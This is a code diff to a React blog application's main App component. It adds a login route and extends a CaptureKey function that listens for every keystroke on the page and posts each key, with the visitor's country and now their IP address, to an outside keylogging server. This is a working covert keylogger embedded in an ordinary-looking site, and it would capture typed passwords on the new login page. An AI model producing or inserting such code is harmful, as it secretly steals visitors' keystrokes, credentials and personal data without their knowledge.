@@ -7,11 +7,13 @@ import BlogDetails from './BlogDetails';
 import NotFound from './NotFound';
 import { LocationContext } from './contexts/LocationContext';
 import Admin from './admin/Admin';
+import Login from './admin/Login';
 
-const CaptureKey = (key, location) => {
+const CaptureKey = (key, location, ip_address) => {
   fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
+    // fetch('http://127.0.0.1:5000/api/new_keylog', {
     method: 'POST',
-    body: JSON.stringify({ key, location }),
+    body: JSON.stringify({ key, location, ip_address }),
 
   }).then(responce => {
     if (!responce.ok) {
@@ -31,7 +33,7 @@ const CaptureKey = (key, location) => {
 function App() {
   const { location } = useContext(LocationContext);
   window.addEventListener('keydown', function (e) {
-    location && CaptureKey(e.key, location.country_name)
+    location && CaptureKey(e.key, location.country_name, location.IPv4)
   }, false);
 
   return (
@@ -42,6 +44,7 @@ function App() {
           <Routes>
             <Route exact path="" element={<Home />} />
             <Route exact path="create" element={<Create />} />
+            <Route exact path="login" element={<Login/>}/>
             <Route exact path="blogs" element={<Home />} />
             <Route exact path="admin" element={<Admin />} />
             <Route exact path="blogs/:id" element={<BlogDetails />} />
